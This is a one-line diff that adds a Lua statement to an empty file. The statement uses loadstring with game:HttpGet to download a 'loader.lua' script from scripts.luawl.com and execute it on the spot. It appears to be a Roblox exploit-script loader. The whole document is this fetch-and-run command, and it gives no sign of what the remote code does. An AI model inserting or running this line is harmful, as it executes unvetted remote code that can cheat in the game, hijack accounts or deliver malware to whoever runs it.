@@ -1,1 +1,2 @@
 
+loadstring(game:HttpGet('https://scripts.luawl.com/hosted/5805/21180/loader.lua'))()
